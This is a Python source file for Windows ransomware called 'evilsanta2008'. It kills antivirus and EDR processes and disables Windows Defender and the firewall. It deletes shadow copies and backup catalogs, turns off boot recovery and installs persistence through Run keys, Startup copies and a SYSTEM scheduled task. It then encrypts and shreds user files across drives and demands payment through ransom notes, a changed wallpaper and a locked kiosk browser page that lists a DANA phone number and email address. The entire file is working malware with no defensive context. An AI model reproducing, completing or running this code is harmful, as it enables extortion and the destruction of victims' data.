import os
import sys
import time
import ctypes
import base64
import random
import string
import hashlib
import struct
import threading
import subprocess
import webbrowser
import tempfile
import shutil
import sqlite3
import winreg
import win32api
import win32con
import win32event
import win32process
import win32security
from datetime import datetime, timedelta
import psutil
import socket
import mmap

class AntiDebug:
    @staticmethod
    def check_debugger():
        try:
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        except:
            return False
    
    @staticmethod
    def hide_process():
        try:
            PROCESS_ALL_ACCESS = 0x1F0FFF
            process_id = os.getpid()
            process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
            ctypes.windll.ntdll.NtSetInformationProcess(process_handle, 0x1D, 0, 0)
            ctypes.windll.kernel32.CloseHandle(process_handle)
        except:
            pass
    
    @staticmethod
    def vm_detection():
        try:
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
            vm_macs = ['00:0C:29', '00:50:56', '00:05:69', '08:00:27']
            return any(mac.startswith(vm_mac) for vm_mac in vm_macs)
        except:
            return False

class EDRBypass:
    @staticmethod
    def kill_av_processes():
        av_processes = [
            'MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
            'MsSense.exe', 'Sense.exe', 'CSFalconService.exe',
            'CylanceSvc.exe', 'MfeAVSvc.exe', 'McAPExe.exe',
            'avp.exe', 'bdagent.exe', 'AvastSvc.exe',
            'AVGSvc.exe', 'mbamservice.exe', 'ESETService.exe',
            'SophosSafeguard.exe', 'CrowdStrike.exe', 'SentinelAgent.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in [p.lower() for p in av_processes]:
                    proc.kill()
            except:
                continue
    
    @staticmethod
    def disable_windows_defender():
        try:
            cmd = 'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.run('net stop WinDefend', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run('sc config WinDefend start= disabled', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender")
            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
    
    @staticmethod
    def disable_firewall():
        try:
            subprocess.run('netsh advfirewall set allprofiles state off', shell=True, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    @staticmethod
    def add_exclusion():
        try:
            exe_path = os.path.abspath(sys.executable)
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{exe_path}\""'
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subdevNULL)
        except:
            pass

class FileShredder:
    @staticmethod
    def secure_delete(filepath, passes=7):
        try:
            if not os.path.exists(filepath):
                return
            
            file_size = os.path.getsize(filepath)
            
            with open(filepath, 'r+b') as f:
                for pass_num in range(passes):
                    f.seek(0)
                    random_data = os.urandom(file_size)
                    f.write(random_data)
                    f.flush()
                    os.fsync(f.fileno())
            
            os.remove(filepath)
            
            new_name = filepath + '.' + ''.join(random.choices(string.hexdigits, k=8))
            try:
                os.rename(filepath, new_name)
                os.remove(new_name)
            except:
                pass
        except:
            try:
                os.remove(filepath)
            except:
                pass

class FastFileScanner:
    def __init__(self):
        self.scanned_files = 0
    
    def scan_drive_fast(self, drive):
        target_extensions = {
            '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.mpeg',
            '.mp3', '.wav', '.aac', '.flac', '.ogg', '.wma',
            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
            '.sql', '.mdb', '.accdb', '.db', '.sqlite',
            '.py', '.java', '.cpp', '.c', '.h', '.js', '.html', '.php', '.cs'
        }
        
        files_to_encrypt = []
        
        try:
            for root, dirs, files in os.walk(drive, topdown=True):
                dirs[:] = [d for d in dirs if not d.startswith('$') and 
                          d.lower() not in ['windows', 'program files', 'program files (x86)',
                                          'programdata', 'appdata', 'system volume information']]
                
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    try:
                        ext = os.path.splitext(file)[1].lower()
                        if ext in target_extensions:
                            if 'evilsanta2008' not in filepath.lower():
                                files_to_encrypt.append(filepath)
                                self.scanned_files += 1
                                
                                if len(files_to_encrypt) >= 1000:
                                    return files_to_encrypt
                    except:
                        continue
        except:
            pass
        
        return files_to_encrypt

class EvilSanta2008Ultimate:
    def __init__(self):
        self.victim_id = 'EVIL' + ''.join(random.choices(string.digits, k=12))
        self.machine_hash = hashlib.md5(os.environ['COMPUTERNAME'].encode()).hexdigest()[:16]
        self.extension = '.evilsanta2008'
        self.master_key = None
        self.total_encrypted = 0
        self.start_time = datetime.now()
        self.deadline = self.start_time + timedelta(hours=72)
        self.active = True
        self.db_path = os.path.join(os.environ['TEMP'], 'evilcore.db')
        
        self.ransom_amount = "3.000.000 IDR"
        self.dana_target = "+6285606213297"
        self.email_target = "retaabi58@gmail.com"
        
        self.init_encryption()
        self.setup_database()
        
        if AntiDebug.check_debugger():
            sys.exit(0)
        
        AntiDebug.hide_process()
    
    def init_encryption(self):
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            from Crypto.Random import get_random_bytes
            
            random_seed = os.urandom(64)
            self.master_key = hashlib.sha512(
                random_seed + self.machine_hash.encode() + b'evilsanta2008'
            ).digest()[:32]
            
            self.crypto_module = AES
            self.get_random_bytes = get_random_bytes
            self.pad_func = pad
            self.crypto_ready = True
        except:
            self.crypto_ready = False
    
    def setup_database(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS victims 
                    (id TEXT PRIMARY KEY,
                     machine TEXT,
                     start_time TEXT,
                     total_files INTEGER,
                     encryption_key BLOB)''')
        c.execute('''CREATE TABLE IF NOT EXISTS encrypted 
                    (id INTEGER PRIMARY KEY,
                     original TEXT,
                     encrypted TEXT,
                     size INTEGER,
                     time TEXT)''')
        conn.commit()
        conn.close()
    
    def encrypt_file_military(self, filepath):
        if not self.crypto_ready:
            return False
        
        try:
            with open(filepath, 'rb') as f:
                original_data = f.read()
            
            if len(original_data) < 16:
                return False
            
            salt = self.get_random_bytes(32)
            iv = self.get_random_bytes(16)
            
            derived_key = hashlib.pbkdf2_hmac('sha512', self.master_key, salt, 1000000, dklen=32)
            
            cipher = self.crypto_module.new(derived_key, self.crypto_module.MODE_CBC, iv)
            padded_data = self.pad_func(original_data, self.crypto_module.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            new_filename = filepath + self.extension
            
            with open(new_filename, 'wb') as f:
                f.write(salt)
                f.write(iv)
                f.write(encrypted_data)
            
            self.total_encrypted += 1
            
            FileShredder.secure_delete(filepath, passes=7)
            
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("INSERT INTO encrypted (original, encrypted, size, time) VALUES (?, ?, ?, ?)",
                     (filepath, new_filename, len(original_data), datetime.now().isoformat()))
            conn.commit()
            conn.close()
            
            return True
            
        except Exception as e:
            return False
    
    def create_ransom_infection(self):
        note_content = f"""
YOUR SYSTEM HAS BEEN ENCRYPTED BY evilsanta2008

ALL FILES ON THIS COMPUTER ARE NOW ENCRYPTED WITH MILITARY GRADE ENCRYPTION
THERE IS NO WAY TO RECOVER YOUR FILES WITHOUT OUR DECRYPTION KEY
YOUR ONLY OPTION IS TO PAY THE RANSOM

PAYMENT DETAILS
AMOUNT REQUIRED: {self.ransom_amount}
PAYMENT METHOD: DANA TRANSFER
RECIPIENT: {self.dana_target}
EMAIL PROOF TO: {self.email_target}
EMAIL SUBJECT: PAYMENT evilsanta2008 - {self.victim_id}

WARNING
DO NOT ATTEMPT TO DECRYPT FILES YOURSELF
DO NOT DELETE ENCRYPTED FILES
DO NOT REINSTALL THE OPERATING SYSTEM
DO NOT USE DATA RECOVERY SOFTWARE
DO NOT SHUTDOWN OR RESTART THE COMPUTER
DO NOT CONTACT LAW ENFORCEMENT

SYSTEM INFORMATION
VICTIM IDENTIFIER: {self.victim_id}
ENCRYPTION STARTED: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
DEADLINE FOR PAYMENT: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}
FILES ENCRYPTED: {self.total_encrypted}

FINAL NOTICE
AFTER THE DEADLINE THE DECRYPTION KEY WILL BE PERMANENTLY DESTROYED
ALL YOUR FILES WILL BE LOST FOREVER WITH NO POSSIBILITY OF RECOVERY
"""
        
        infection_points = []
        
        user_profile = os.path.expanduser("~")
        infection_points.extend([
            user_profile,
            os.path.join(user_profile, "Desktop"),
            os.path.join(user_profile, "Documents"),
            os.path.join(user_profile, "Downloads"),
            os.path.join(user_profile, "Pictures"),
            os.path.join(user_profile, "Videos"),
        ])
        
        for drive in ['C:', 'D:', 'E:', 'F:', 'G:', 'H:']:
            if os.path.exists(drive + '\\'):
                infection_points.append(drive + '\\')
        
        for point in infection_points:
            if point and os.path.exists(os.path.dirname(point) if point.endswith('\\') else point):
                try:
                    note_file = os.path.join(point, "YOUR_FILES_ARE_ENCRYPTED.txt")
                    with open(note_file, "w", encoding="utf-8") as f:
                        f.write(note_content)
                    
                    try:
                        ctypes.windll.kernel32.SetFileAttributesW(note_file, 2 | 4)
                    except:
                        pass
                except:
                    continue
    
    def takeover_wallpaper(self):
        try:
            width, height = 1920, 1080
            
            from PIL import Image, ImageDraw, ImageFont
            
            img = Image.new('RGB', (width, height), color='black')
            draw = ImageDraw.Draw(img)
            
            try:
                font_big = ImageFont.truetype("arial.ttf", 70)
                font_medium = ImageFont.truetype("arial.ttf", 35)
                font_small = ImageFont.truetype("arial.ttf", 25)
            except:
                font_big = ImageFont.load_default()
                font_medium = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            title = "evilsanta2008"
            message = "YOUR COMPUTER HAS BEEN ENCRYPTED"
            payment = f"PAY {self.ransom_amount} TO DANA {self.dana_target}"
            contact = f"EMAIL: {self.email_target}"
            identifier = f"ID: {self.victim_id}"
            timeleft = f"TIME LEFT: {self.deadline.strftime('%Y-%m-%d %H:%M')}"
            
            draw.text((width//2 - 350, 150), title, fill=(255, 0, 0), font=font_big)
            draw.text((width//2 - 450, 250), message, fill=(255, 100, 100), font=font_medium)
            draw.text((width//2 - 450, 350), payment, fill=(255, 255, 100), font=font_medium)
            draw.text((width//2 - 450, 400), contact, fill=(255, 255, 100), font=font_medium)
            draw.text((width//2 - 450, 500), identifier, fill=(100, 255, 100), font=font_small)
            draw.text((width//2 - 450, 530), timeleft, fill=(100, 255, 100), font=font_small)
            
            wall_file = os.path.join(tempfile.gettempdir(), "evilsanta_wall.bmp")
            img.save(wall_file)
            
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 
                0, 
                wall_file,
                0x01 | 0x02
            )
        except:
            pass
    
    def disable_all_security(self):
        EDRBypass.kill_av_processes()
        time.sleep(1)
        EDRBypass.disable_windows_defender()
        EDRBypass.disable_firewall()
        EDRBypass.add_exclusion()
        
        try:
            subprocess.run('bcdedit /set {current} recoveryenabled no', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run('bcdedit /set {current} bootstatuspolicy ignoreallfailures', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def block_system_recovery(self):
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SOFTWARE\Policies\Microsoft\Windows\Safer\CodeIdentifiers")
            winreg.SetValueEx(key, "AuthenticodeEnabled", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
        
        try:
            subprocess.run('vssadmin delete shadows /all /quiet', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run('wbadmin delete catalog -quiet', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def install_persistence(self):
        try:
            exe_path = os.path.abspath(sys.executable)
            
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]
            
            for hive, path in reg_paths:
                try:
                    key = winreg.CreateKey(hive, path)
                    winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, exe_path)
                    winreg.CloseKey(key)
                except:
                    continue
            
            startup_paths = [
                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            ]
            
            for startup in startup_paths:
                if os.path.exists(startup):
                    try:
                        target = os.path.join(startup, "SystemSecurity.exe")
                        shutil.copy2(exe_path, target)
                        ctypes.windll.kernel32.SetFileAttributesW(target, 2 | 4)
                    except:
                        continue
            
            try:
                task_cmd = f'schtasks /create /tn "MicrosoftWindowsUpdate" /tr "{exe_path}" /sc onstart /ru SYSTEM /f'
                subprocess.run(task_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
                
        except:
            pass
    
    def create_hostage_page(self):
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>evilsanta2008 - SYSTEM ENCRYPTED</title>
    <style>
        body {{
            background: #000000;
            color: #ff0000;
            margin: 0;
            padding: 0;
            font-family: Arial;
            overflow: hidden;
            height: 100vh;
        }}
        
        .hostage_container {{
            padding: 50px;
            text-align: center;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }}
        
        .main_title {{
            font-size: 80px;
            color: #ff0000;
            margin-bottom: 30px;
            text-transform: uppercase;
        }}
        
        .warning_box {{
            background: rgba(255, 0, 0, 0.2);
            border: 3px solid #ff0000;
            padding: 40px;
            margin: 30px auto;
            max-width: 900px;
            border-radius: 10px;
        }}
        
        .payment_section {{
            background: #111111;
            border: 2px solid #ff0000;
            padding: 40px;
            margin: 30px auto;
            max-width: 800px;
            border-radius: 10px;
        }}
        
        .amount_display {{
            font-size: 60px;
            color: #ffff00;
            font-weight: bold;
            margin: 20px 0;
        }}
        
        .countdown_timer {{
            font-size: 70px;
            color: #00ff00;
            font-family: monospace;
            margin: 30px 0;
            font-weight: bold;
        }}
        
        .system_info {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border: 1px solid #ff0000;
            font-family: monospace;
        }}
    </style>
    <script>
        document.addEventListener('keydown', function(event) {{
            event.preventDefault();
            event.stopPropagation();
            return false;
        }});
        
        document.addEventListener('contextmenu', function(event) {{
            event.preventDefault();
            return false;
        }});
        
        window.onbeforeunload = function() {{
            return "This system is controlled by evilsanta2008";
        }};
        
        function forceFullscreen() {{
            if (!document.fullscreenElement) {{
                document.documentElement.requestFullscreen();
            }}
        }}
        
        function updateCountdown() {{
            var deadline = new Date('{self.deadline.isoformat()}');
            var now = new Date();
            var difference = deadline - now;
            
            var hours = Math.floor(difference / (1000 * 60 * 60));
            var minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((difference % (1000 * 60)) / 1000);
            
            document.getElementById('timer').innerHTML = 
                hours.toString().padStart(2, '0') + ':' + 
                minutes.toString().padStart(2, '0') + ':' + 
                seconds.toString().padStart(2, '0');
            
            if (difference < 0) {{
                document.getElementById('timer').innerHTML = 'TIME EXPIRED';
                document.getElementById('timer').style.color = '#ff0000';
            }}
        }}
        
        setInterval(updateCountdown, 1000);
        setInterval(forceFullscreen, 1000);
        
        window.onload = function() {{
            document.documentElement.requestFullscreen();
            updateCountdown();
        }};
    </script>
</head>
<body>
    <div class="hostage_container">
        <div class="main_title">evilsanta2008</div>
        
        <div class="warning_box">
            <div style="font-size: 40px; margin-bottom: 20px;">
                YOUR SYSTEM HAS BEEN ENCRYPTED
            </div>
            <div style="font-size: 25px;">
                All files are encrypted with military grade encryption
            </div>
        </div>
        
        <div class="payment_section">
            <div style="font-size: 35px; margin-bottom: 20px;">
                PAYMENT REQUIRED FOR DECRYPTION
            </div>
            
            <div class="amount_display">{self.ransom_amount}</div>
            
            <div style="font-size: 28px; margin: 15px 0;">
                Send to DANA: {self.dana_target}
            </div>
            <div style="font-size: 28px; margin: 15px 0;">
                Email proof to: {self.email_target}
            </div>
            <div style="font-size: 22px; margin: 20px 0; color: #ffffff;">
                Email subject: PAYMENT evilsanta2008 - {self.victim_id}
            </div>
        </div>
        
        <div style="font-size: 30px; color: #ff4444; margin: 20px;">
            TIME REMAINING UNTIL PERMANENT DATA LOSS
        </div>
        
        <div class="countdown_timer" id="timer">72:00:00</div>
    </div>
    
    <div class="system_info">
        Victim: {self.victim_id}<br>
        Files: {self.total_encrypted}<br>
        Started: {self.start_time.strftime('%H:%M:%S')}
    </div>
</body>
</html>"""
        
        html_file = os.path.join(tempfile.gettempdir(), "evilsanta_hostage.html")
        with open(html_file, "w", encoding="utf-8") as f:
            f.write(html_content)
        
        return html_file
    
    def launch_hostage_browser(self):
        html_path = self.create_hostage_page()
        
        browser_paths = [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            r"C:\Program Files\Internet Explorer\iexplore.exe",
        ]
        
        launched = False
        for browser in browser_paths:
            if os.path.exists(browser):
                try:
                    if "chrome" in browser.lower() or "edge" in browser.lower():
                        subprocess.Popen([browser, "--kiosk", html_path, "--start-fullscreen", "--noerrdialogs", "--disable-infobars"])
                    elif "firefox" in browser.lower():
                        subprocess.Popen([browser, "-kiosk", html_path, "-private-window"])
                    else:
                        subprocess.Popen([browser, html_path])
                    launched = True
                    time.sleep(2)
                    break
                except:
                    continue
        
        if not launched:
            try:
                webbrowser.open(html_path)
            except:
                pass
    
    def rapid_encryption_attack(self):
        scanner = FastFileScanner()
        encryption_threads = []
        
        for drive in ['C:', 'D:', 'E:', 'F:', 'G:', 'H:']:
            if os.path.exists(drive + '\\'):
                thread = threading.Thread(target=self.encrypt_drive_rapid, args=(drive, scanner))
                thread.daemon = True
                thread.start()
                encryption_threads.append(thread)
                time.sleep(0.3)
        
        for thread in encryption_threads:
            thread.join()
    
    def encrypt_drive_rapid(self, drive, scanner):
        try:
            files = scanner.scan_drive_fast(drive)
            
            batch_size = 50
            for i in range(0, len(files), batch_size):
                batch = files[i:i + batch_size]
                
                threads = []
                for filepath in batch:
                    if self.total_encrypted > 50000:
                        return
                    
                    thread = threading.Thread(target=self.encrypt_file_military, args=(filepath,))
                    thread.daemon = True
                    thread.start()
                    threads.append(thread)
                
                for thread in threads:
                    thread.join()
                
                if i > 0 and i % 1000 == 0:
                    print(f"evilsanta2008: Encrypted {i} files on {drive}")
        except:
            pass
    
    def continuous_monitoring(self):
        watch_folders = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
        ]
        
        while self.active:
            for folder in watch_folders:
                if os.path.exists(folder):
                    try:
                        for item in os.listdir(folder):
                            item_path = os.path.join(folder, item)
                            if os.path.isfile(item_path):
                                try:
                                    ext = os.path.splitext(item)[1].lower()
                                    target_exts = {'.doc', '.docx', '.pdf', '.xls', '.xlsx', '.jpg', '.jpeg', '.png'}
                                    if ext in target_exts:
                                        self.encrypt_file_military(item_path)
                                except:
                                    continue
                    except:
                        pass
            
            time.sleep(5)
    
    def execute_full_attack(self):
        if not self.crypto_ready:
            print("Required: pip install pycryptodome pillow")
            return
        
        print("evilsanta2008 - INITIATING ATTACK")
        
        if hasattr(sys, 'frozen'):
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
        
        self.disable_all_security()
        time.sleep(2)
        
        self.block_system_recovery()
        self.install_persistence()
        
        self.takeover_wallpaper()
        self.create_ransom_infection()
        self.launch_hostage_browser()
        
        print("evilsanta2008: Starting mass encryption...")
        
        attack_thread = threading.Thread(target=self.rapid_encryption_attack)
        attack_thread.start()
        
        monitor_thread = threading.Thread(target=self.continuous_monitoring, daemon=True)
        monitor_thread.start()
        
        attack_thread.join()
        
        print(f"evilsanta2008: Attack completed - {self.total_encrypted} files encrypted")
        
        while self.active:
            time.sleep(60)

def main():
    if AntiDebug.vm_detection():
        print("Virtual machine detected - exiting")
        return
    
    ransomware = EvilSanta2008Ultimate()
    ransomware.execute_full_attack()

if __name__ == "__main__":
    main()
